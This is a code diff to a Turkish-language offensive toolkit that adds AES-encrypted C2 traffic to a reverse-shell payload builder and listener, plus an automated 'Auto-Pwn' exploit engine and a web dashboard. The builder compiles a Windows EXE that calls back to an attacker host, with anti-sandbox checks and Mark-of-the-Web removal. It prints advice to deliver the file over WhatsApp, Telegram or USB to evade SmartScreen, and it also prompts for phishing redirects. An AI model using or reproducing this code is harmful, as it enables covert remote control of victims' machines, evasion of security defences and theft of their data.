@@ -268,10 +268,33 @@ sh.Run psCmd, 0, False
 #  C2 MENÜLERİ
 # ══════════════════════════════════════════════════════════
 
+def encrypt_aes(data, key):
+    try:
+        from Crypto.Cipher import AES
+        from Crypto.Util.Padding import pad
+        if isinstance(data, str): data = data.encode('utf-8')
+        cipher = AES.new(key, AES.MODE_CBC)
+        ct_bytes = cipher.encrypt(pad(data, AES.block_size))
+        import base64
+        return base64.b64encode(cipher.iv + ct_bytes)
+    except: return data
+
+def decrypt_aes(enc_data, key):
+    try:
+        from Crypto.Cipher import AES
+        from Crypto.Util.Padding import unpad
+        import base64
+        raw = base64.b64decode(enc_data)
+        iv = raw[:16]
+        ct = raw[16:]
+        cipher = AES.new(key, AES.MODE_CBC, iv)
+        return unpad(cipher.decrypt(ct), AES.block_size).decode('utf-8', errors='replace')
+    except: return ""
+
 def c2_payload_builder():
     clear_screen()
     print_banner()
-    print(f"{C.YELLOW}[*] C2 Payload Builder{C.RESET}\n")
+    print(f"{C.YELLOW}[*] C2 Payload Builder (AES-256 Şifreli){C.RESET}\n")
     print_line()
     print(f"{C.DIM}  [!] Önerilen Portlar: 443 (HTTPS), 80 (HTTP), 53 (DNS) - Güvenlik duvarlarını aşmak için{C.RESET}\n")
 
@@ -285,8 +308,8 @@ def c2_payload_builder():
 
     print_line()
     print(f"\n{C.BLUE}{C.BOLD}  --- Hedef Sistem ---{C.RESET}")
-    print(f"  {C.CYAN}1){C.RESET} Windows (Tek EXE Payload)")
-    print(f"  {C.CYAN}2){C.RESET} Linux (Bash Reverse Shell)")
+    print(f"  {C.CYAN}1){C.RESET} Windows (Tek EXE Payload - AES256)")
+    print(f"  {C.CYAN}2){C.RESET} Linux (Bash Reverse Shell - Plain)")
 
     os_choice = input(f"\n{C.CYAN}  [>] Seçiminiz: {C.RESET}").strip()
 
@@ -299,6 +322,10 @@ def c2_payload_builder():
         exe_name = input(f"{C.CYAN}  [?] EXE dosya adı {C.DIM}[setup]{C.RESET}: ").strip() or "setup"
 
         print(f"\n{C.YELLOW}  [*] Payload oluşturuluyor...{C.RESET}")
+        
+        aes_key = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
+        save_text("c2_aes_key.txt", aes_key)
+        print(f"{C.GREEN}  [+] AES-256 Anahtarı Üretildi ve Kaydedildi.{C.RESET}")
 
         # Reverse shell Python scripti oluştur
         output_dir = "stealth_dropper"
@@ -342,6 +369,7 @@ except:
         stub_code = stub_code.replace("__LHOST__", lhost)
         stub_code = stub_code.replace("__LPORT__", str(lport))
         stub_code = stub_code.replace("__ANTI_SB__", anti_sb_code)
+        stub_code = stub_code.replace("__AES_KEY__", aes_key)
         save_text(stub_path, stub_code)
 
         print(f"{C.YELLOW}  [*] Nuitka ile native EXE derleniyor (bu biraz sürebilir)...{C.RESET}")
@@ -398,7 +426,7 @@ except:
             print(f"{C.WHITE}  📦 Boyut   : {exe_size:.1f} MB{C.RESET}")
             print(f"{C.WHITE}  🛡️  Anti-SB : {'Açık' if anti_sb else 'Kapalı (Test Modu)'}{C.RESET}")
             print(f"{C.WHITE}  🎯 Hedef   : {lhost}:{lport}{C.RESET}")
-            print(f"{C.WHITE}  🔧 Derleyici: Nuitka (Native C){C.RESET}")
+            print(f"{C.WHITE}  🔧 Şifreleme: AES-256 E2E Encryption{C.RESET}")
             print(f"{C.WHITE}  🛡️  MOTW    : Temizlendi ✅{C.RESET}")
             print(f"\n{C.YELLOW}  [!] Bu EXE'yi hedefe gönderip çift tıklatmanız yeterli.{C.RESET}")
             print(f"{C.YELLOW}  [!] SmartScreen bypass: WhatsApp/Telegram/USB ile gönderin.{C.RESET}")
@@ -432,8 +460,18 @@ def c2_listener():
     port_str = input(f"{C.CYAN}  [?] Dinlenecek Port: {C.RESET}").strip()
     if not port_str.isdigit():
         return
-
     port = int(port_str)
+
+    # AES Key Yükle
+    aes_key = None
+    if os.path.exists("c2_aes_key.txt"):
+        with open("c2_aes_key.txt", "r") as f:
+            aes_key = f.read().strip().encode('utf-8')
+        print(f"{C.GREEN}  [+] Mevcut AES-256 Anahtarı yüklendi.{C.RESET}")
+    else:
+        print(f"{C.YELLOW}  [!] Uyarı: AES-256 Anahtarı bulunamadı! (c2_aes_key.txt yok){C.RESET}")
+        print(f"{C.DIM}      Şifresiz (Plaintext) payload bağlantısı beklenecek.{C.RESET}")
+
     loot_dir = "loot"
     os.makedirs(loot_dir, exist_ok=True)
 
@@ -451,78 +489,56 @@ def c2_listener():
         conn, addr = s.accept()
         conn.settimeout(30)
         print(f"{C.RED}{C.BOLD}  [!] BAĞLANTI GELDİ: {addr[0]}:{addr[1]}{C.RESET}\n")
+        
+        import sys
+        sys.path.append(os.path.dirname(os.path.abspath(__file__)))
+        try:
+            import Notifier
+            Notifier.send_alert(f"New C2 connection received from {addr[0]}:{addr[1]}.", title="🚀 NEW SHELL SECURED")
+        except: pass
 
         while True:
             try:
-                cmd = input(f"{C.RED}C2-Shell>{C.RESET} ")
-                if cmd.lower() in ['exit', 'quit']:
-                    break
-                if not cmd.strip():
-                    continue
-
-                # Upload komutu - dosya gonder
-                if cmd.startswith("!ul "):
-                    parts = cmd.split(" ", 1)
-                    if len(parts) == 2:
-                        local_path = parts[1].strip()
-                        if os.path.exists(local_path):
-                            remote_name = input(f"{C.CYAN}  [?] Hedefteki dosya yolu: {C.RESET}").strip()
-                            with open(local_path, "rb") as f:
-                                data = base64.b64encode(f.read()).decode()
-                            cmd = f"!ul {remote_name} {data}"
-                            print(f"{C.DIM}  [*] Dosya gönderiliyor ({len(data)} byte)...{C.RESET}")
-                        else:
-                            print(f"{C.RED}  [-] Yerel dosya bulunamadı: {local_path}{C.RESET}")
-                            continue
-
-                conn.sendall(cmd.encode("utf-8") + b"\n")
-
-                # Yaniti al
+                # Gelen veriyi şifreli veya şifresiz oku
                 response = b""
                 while True:
                     try:
                         chunk = conn.recv(65536)
                         if not chunk:
-                            print(f"\n{C.RED}  [-] Bağlantı koptu!{C.RESET}")
                             break
                         response += chunk
-                        if b"> " in chunk:
+                        if b"\n" in chunk: # Yeni satır ayırıcı
                             break
                     except socket.timeout:
                         break
 
                 if not response:
+                    print(f"\n{C.RED}  [-] Bağlantı koptu!{C.RESET}")
                     break
-
-                resp_str = response.decode("utf-8", errors="replace")
-
-                # Screenshot verisi geldi mi?
-                if "!SS_DATA:" in resp_str:
-                    try:
-                        b64_data = resp_str.split("!SS_DATA:")[1].split("\n")[0]
-                        ss_file = os.path.join(loot_dir, f"screenshot_{int(time.time())}.png")
-                        with open(ss_file, "wb") as f:
-                            f.write(base64.b64decode(b64_data))
-                        print(f"{C.GREEN}  [+] Screenshot kaydedildi: {os.path.abspath(ss_file)}{C.RESET}")
-                        if os.name == 'nt':
-                            os.startfile(os.path.abspath(ss_file))
-                    except Exception as e:
-                        print(f"{C.RED}  [-] Screenshot kaydetme hatası: {e}{C.RESET}")
-
-                # Download verisi geldi mi?
-                elif "!DL_DATA:" in resp_str:
-                    try:
-                        parts = resp_str.split("!DL_DATA:")[1].split("\n")[0]
-                        fname, b64_data = parts.split(":", 1)
-                        dl_file = os.path.join(loot_dir, fname)
-                        with open(dl_file, "wb") as f:
-                            f.write(base64.b64decode(b64_data))
-                        print(f"{C.GREEN}  [+] Dosya indirildi: {os.path.abspath(dl_file)}{C.RESET}")
-                    except Exception as e:
-                        print(f"{C.RED}  [-] İndirme hatası: {e}{C.RESET}")
+                
+                # Çöz (Eğer AES key varsa)
+                if aes_key:
+                    resp_str = decrypt_aes(response.strip(), aes_key)
                 else:
-                    # Normal cikti
-                    print(f"{C.WHITE}{resp_str}{C.RESET}", end="")
+                    resp_str = response.decode("utf-8", errors="replace")
+                
+                print(f"{C.WHITE}{resp_str}{C.RESET}", end="")
+                
+                # Şimdi komut gönder
+                cmd = input(f"{C.RED}C2-Shell>{C.RESET} ")
+                if cmd.lower() in ['exit', 'quit']:
+                    if aes_key: conn.sendall(encrypt_aes(cmd, aes_key) + b"\n")
+                    else: conn.sendall(cmd.encode("utf-8") + b"\n")
+                    break
+                if not cmd.strip():
+                    if aes_key: conn.sendall(encrypt_aes("echo .", aes_key) + b"\n")
+                    else: conn.sendall(b"\n")
+                    continue
+
+                if aes_key:
+                    conn.sendall(encrypt_aes(cmd, aes_key) + b"\n")
+                else:
+                    conn.sendall(cmd.encode("utf-8") + b"\n")
 
             except (ConnectionResetError, BrokenPipeError, ConnectionAbortedError):
                 print(f"\n{C.RED}  [-] Bağlantı koptu!{C.RESET}")
@@ -815,6 +831,15 @@ def prompt_for_tool(script_path):
         redir = input(f"  {C.CYAN}[?] Kurban Nereye Yönlendirilsin? {C.DIM}[https://google.com]{C.RESET}: ").strip() or "https://google.com"
         title = input(f"  {C.CYAN}[?] Sahte Sayfa Başlığı {C.DIM}[Kurumsal Portal]{C.RESET}: ").strip() or "Kurumsal Portal"
         args.extend([port, redir, title])
+        
+    # --- Auto-Pwn ---
+    elif "Auto_Pwn.py" in script_path:
+        print(f"{C.YELLOW}  [*] Otopilot (Auto-Pwn) Sihirbazı{C.RESET}")
+        target = input(f"  {C.CYAN}[?] Hedef IP: {C.RESET}").strip()
+        wordlist = input(f"  {C.CYAN}[?] Wordlist Yolu (Opsiyonel): {C.RESET}").strip()
+        if target:
+            args.append(target)
+            if wordlist: args.append(wordlist)
 
     # --- Post-Exploitation ---
     elif "Reverse_Shell_Gen.py" in script_path:
@@ -997,6 +1022,8 @@ def main_menu():
         print(f"  {C.CYAN}9){C.RESET} {C.RED}Wireless Attacks{C.RESET}             {C.DIM}— Evil Twin, Sahte WiFi AP{C.RESET}")
         print(f" {C.CYAN}10){C.RESET} {C.RED}C2 Framework{C.RESET}                 {C.DIM}— Payload Builder & Listener (Stealth){C.RESET}")
         print(f" {C.CYAN}11){C.RESET} {C.MAGENTA}Reporting (Raporlama){C.RESET}        {C.DIM}— Otomatik HTML Pentest Raporu Üretici{C.RESET}")
+        print(f" {C.CYAN}12){C.RESET} {C.RED}{C.BOLD}🤖 Auto-Pwn (Otopilot){C.RESET}       {C.DIM}— Taramadan Exploit'e otomatik saldırı motoru{C.RESET}")
+        print(f" {C.CYAN}13){C.RESET} {C.CYAN}{C.BOLD}🌐 Web Dashboard{C.RESET}           {C.DIM}— Araçları tarayıcıdan yönet (Flask Web UI){C.RESET}")
         print(f"  {C.CYAN}0){C.RESET} Çıkış\n")
 
         try:
@@ -1044,6 +1071,11 @@ def main_menu():
                 elif c2c == '0': break
         elif choice == '11':
             external_menu_category("Reporting", reporting_tools)
+        elif choice == '12':
+            run_external_tool(os.path.join(base_dir, "Auto_Pwn.py"), "Auto-Pwn Engine")
+        elif choice == '13':
+            import Web_Dashboard
+            Web_Dashboard.start_web_server()
         elif choice == '0':
             clear_screen()
             print(f"{C.RED}  [*] The Ultimate Pentest Arsenal kapatılıyor... İyi avlar!{C.RESET}\n")
